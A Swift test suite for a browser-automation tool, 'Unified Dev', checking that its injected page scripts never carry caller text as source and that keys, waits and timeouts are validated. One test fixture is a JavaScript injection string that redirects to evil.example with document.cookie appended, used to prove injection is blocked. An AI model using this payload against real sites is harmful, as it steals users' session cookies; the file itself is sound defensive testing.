import Foundation
import Testing
@testable import Core

@Suite("The five scripts Unified Dev runs in a page", .tags(.security))
struct BrowserAgentScriptTests {
    @Test("no script carries the caller's text in its source")
    func textNeverReachesTheSource() {
        let nasty = "\"); window.location = 'https://evil.example/' + document.cookie; (\""
        let script = BrowserAgentScript.fill(BrowserAgentReference(index: 2), nasty)

        #expect(!script.body.contains("evil.example"))
        #expect(!script.body.contains(nasty))
        #expect(script.arguments["text"] == .text(nasty))
    }

    @Test("a reference reaches a script as a number, never as source")
    func referencesAreNumbers() {
        let script = BrowserAgentScript.click(BrowserAgentReference(index: 7))

        #expect(script.arguments["index"] == .number(7))
        #expect(!script.body.contains("e7"))
    }

    @Test("every script is a function body with no interpolation at all")
    func bodiesAreFixed() {
        let bodies = [
            BrowserAgentScript.outline,
            .click(BrowserAgentReference(index: 1)),
            .fill(BrowserAgentReference(index: 1), "anything"),
            .press(.enter, nil),
            .settled(.text("Saved")),
        ].map(\.body)

        for body in bodies {
            #expect(!body.contains("anything"))
            #expect(!body.contains("Saved"))
            #expect(body.contains("window.__unifieddevAgent"))
        }
    }

    @Test("a wait condition carries its needle as an argument")
    func waitCarriesItsNeedle() {
        let script = BrowserAgentScript.settled(.gone("Spinner"))

        #expect(script.arguments["gone"] == .text("Spinner"))
        #expect(script.arguments["text"] == nil)
    }

    @Test("the three waits are three bodies, so no needle is ever an undeclared name")
    func eachWaitHasItsOwnBody() {
        let load = BrowserAgentScript.settled(.load).body
        let appearing = BrowserAgentScript.settled(.text("x")).body
        let leaving = BrowserAgentScript.settled(.gone("x")).body

        #expect(load != appearing)
        #expect(appearing != leaving)
        #expect(BrowserAgentScript.settled(.load).arguments.isEmpty)
    }

    @Test("a key press is one of a fixed list, and anything else is refused by name", arguments: [
        "return", "cmd+s", "a", "", "KeyA", "f5",
    ])
    func keysAreAFixedList(raw: String) {
        let parsed = BrowserKeyPress.parse(raw)

        guard case .failure(let refusal) = parsed else {
            Issue.record("'\(raw)' was accepted as a key")
            return
        }
        #expect(refusal.sentence.contains("'enter'"))
    }

    @Test("the keys that are offered all parse")
    func everyOfferedKeyParses() {
        for key in BrowserKeyPress.allCases {
            guard case .success(let parsed) = BrowserKeyPress.parse(key.rawValue) else {
                Issue.record("\(key.rawValue) does not parse")
                return
            }
            #expect(parsed == key)
        }
    }

    @Test("a wait with neither text nor gone waits for the load, and both at once is refused")
    func waitParsing() {
        guard case .success(let load) = BrowserWaitCondition.parse(text: nil, gone: nil) else {
            Issue.record("a bare wait did not parse")
            return
        }
        #expect(load == .load)

        guard case .failure(let refusal) = BrowserWaitCondition.parse(text: "a", gone: "b") else {
            Issue.record("a wait for two things at once was accepted")
            return
        }
        #expect(refusal.sentence.contains("one"))
    }

    @Test("the seconds a wait takes are bounded, and a missing value takes the fallback")
    func secondsAreBounded() {
        guard case .success(let fallback) = BrowserWaitSeconds.parse(nil) else {
            Issue.record("a missing 'seconds' did not fall back")
            return
        }
        #expect(fallback == BrowserWaitSeconds.fallback)

        guard case .failure(let tooLong) = BrowserWaitSeconds.parse(.integer(120)) else {
            Issue.record("120 seconds was accepted")
            return
        }
        #expect(tooLong.sentence.contains("\(BrowserWaitSeconds.maximum)"))
    }

    @Test("a press with no element still declares one, so the body never reads a missing name")
    func aPageWidePressStillCarriesAnIndex() {
        let script = BrowserAgentScript.press(.enter, nil)

        #expect(script.arguments["index"] == .number(0))
        #expect(script.arguments["key"] == .text("enter"))
    }

    @Test("the world the scripts run in is named once")
    func theWorldIsNamedOnce() {
        #expect(BrowserAgentScript.world == "unified-dev-agent")
    }
}
